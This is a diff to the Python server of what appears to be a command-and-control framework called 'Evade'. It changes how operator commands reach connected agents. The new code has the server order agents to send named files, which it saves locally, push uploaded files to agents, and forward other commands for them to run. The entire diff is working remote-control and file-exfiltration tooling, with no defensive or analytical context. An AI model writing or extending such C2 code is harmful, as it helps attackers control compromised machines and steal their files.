@@ -44,23 +44,7 @@ def handle_agent_connection(conn, addr):
         print(f"Error handling agent connection: {e}")
         conn.close()
 
-def handle_agent_commands(conn, agent_id):
-    '''Processes commands received for agents from backend.'''
-    try:
-        while True:
-            command = conn.recv(2048).decode().strip()
-            if not command:
-                continue
 
-            # Check if the command is a special command like download, upload, or cd
-            if command.startswith(('download', 'upload', 'cd')):
-                handle_special_command(conn, agent_id, command)
-            else:
-                handle_normal_command(conn, agent_id, command)
-
-    except Exception as e:
-        print(f"Error processing agent commands: {e}")
-        conn.close()
 
 def handle_special_command(conn, agent_id, command):
     '''Handles special commands like download, upload, and cd.'''
@@ -68,10 +52,9 @@ def handle_special_command(conn, agent_id, command):
         # Split the command to get the action and optional parameters
         cmd_parts = command.split(" ", 1)
         action = cmd_parts[0]
-
         if action == 'download':
             filename = cmd_parts[1] if len(cmd_parts) > 1 else ''
-            handle_download(conn, filename)
+            handle_download(agent_id, filename)  # Corrected to match function signature
         elif action == 'upload':
             filename = cmd_parts[1] if len(cmd_parts) > 1 else ''
             handle_upload(conn, filename)
@@ -86,49 +69,81 @@ def handle_special_command(conn, agent_id, command):
         print(f"Error handling special command: {e}")
         conn.close()
 
-def handle_download(conn, filename):
-    """Handles download command."""
-    try:
-        if os.path.isfile(filename):
-            file_size = os.path.getsize(filename)
-            conn.send(str(file_size).encode())
+def handle_download(agent_id, filename):
+    """
+    Initiates a file download from the agent, handles receiving the file.
+    """
+    agent_conn = agent_connections.get(agent_id)
+    if not agent_conn:
+        print(f"No active connection for agent {agent_id}")
+        return
 
-            with open(filename, 'rb') as f:
-                while True:
-                    chunk = f.read(2048)
-                    if not chunk:
-                        break
-                    conn.send(chunk)
-        elif os.path.isdir(filename):
-            conn.send(b"Is a directory")
-        else:
-            conn.send(b"File does not exist")
-    except Exception as e:
-        response = f"Error during download: {str(e)}"
-        conn.send(response.encode())
+    # Send the download command to the agent
+    download_command = f"download {filename}"
+    agent_conn.send(download_command.encode())
+
+    # Await agent's response regarding the file's existence and size
+    response = agent_conn.recv(2048).decode()
+
+    if response == "File does not exist":
+        print(f"Error: File does not exist on agent side - {agent_id}.")
+        # Optionally, inform backend about the error
+    elif response == "Is a directory":
+        print(f"Error: Path is a directory, not a file - {agent_id}.")
+    else:
+        try:
+            file_size = int(response)
+            output_dir = 'downloaded_files'
+            os.makedirs(output_dir, exist_ok=True)
+            file_path = os.path.join(output_dir, os.path.basename(filename))
+
+            with open(file_path, 'wb') as file:
+                received_size = 0
+                while received_size < file_size:
+                    data = agent_conn.recv(2048)
+                    if not data:
+                        break  # Handle unexpected end of data
+                    file.write(data)
+                    received_size += len(data)
+
+            response=f"Download of '{filename}' from {agent_id} completed."
+            print(response)
+            send_result_back_to_backend(response, agent_id)
+        except ValueError:
+            print(f"Invalid response for file size from agent {agent_id}.")
 
 def handle_upload(conn, filename):
     """Handles upload command."""
+    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\upload'
+    file_path = os.path.join(upload_dir, filename)
     try:
-        # Receive file size from agent
-        file_size = int(conn.recv(1024).decode())
-
-        # Confirm readiness to receive file
-        conn.send(b"Ready for upload")
-
-        # Receive file data
-        received_size = 0
-        with open(filename, 'wb') as f:
-            while received_size < file_size:
-                chunk = conn.recv(2048)
-                f.write(chunk)
-                received_size += len(chunk)
-
-        # Notify agent about successful upload
-        conn.send(b"File Upload Successful.")
+        if os.path.exists(file_path):
+            file_size = os.path.getsize(file_path)
+            if file_size > 0:
+                cmd = f"upload {filename} {file_size}"
+                conn.send(cmd.encode())
+                response = conn.recv(2048).decode()
+                if response.strip() == "Ready for upload":
+                    with open(file_path, 'rb') as f:
+                        while True:
+                            chunk = f.read(2048)
+                            if not chunk:
+                                break  # End of file
+                            conn.send(chunk)
+                    # Waiting for the agent's acknowledgment of upload completion
+                    response = conn.recv(2048).decode()
+                    if response.startswith("File Upload Successful"):
+                        print("File uploaded successfully.")
+                    else:
+                        print("Error during file upload.")
+                else:
+                    print("Client not ready to receive file.")
+            else:
+                print("Error: File is empty.")
+        else:
+            print("Error: File not found.")
     except Exception as e:
-        response = f"Error during upload: {str(e)}"
-        conn.send(response.encode())
+        print(f"Error during upload: {str(e)}")
 
 def handle_change_directory(conn, directory):
     """Handles change directory command."""
@@ -178,7 +193,7 @@ def start_tcp_server(ip, agent_port):
     threading.Thread(target=start_agent_listener, args=(ip, agent_port)).start()
 
     # Start listener for backend commands
-    threading.Thread(target=start_command_listener, args=(ip, COMMAND_PORT)).start()
+    threading.Thread(target=start_command_listener, args=('127.0.0.1', COMMAND_PORT)).start()
 
 def start_command_listener(ip, port):
     """Listens for command dispatches from the backend."""
@@ -191,7 +206,7 @@ def start_command_listener(ip, port):
             conn, addr = s.accept()
             backend_connection = conn
             threading.Thread(target=handle_command_connection, args=(conn, addr)).start()
-
+ 
 def receive_agent_response(conn, agent_id):
     '''Receives response from agent for the command sent.'''
     try:
@@ -222,7 +237,15 @@ def handle_command_connection(conn, addr):
             agent_id = command_json.get('agent_id')
             command = command_json.get('command')
             if agent_id and command:
-                send_command_to_agent(agent_id, command)
+                # Check if the agent connection exists
+                agent_conn = agent_connections.get(agent_id)
+                if agent_conn:
+                    if command.startswith(('download', 'upload')):
+                        handle_special_command(agent_conn, agent_id, command)
+                    else:
+                        handle_normal_command(agent_conn, agent_id, command)
+                else:
+                    print(f"No active connection found for Agent {agent_id}")
             else:
                 print("Incomplete command data received from backend.")
         else:
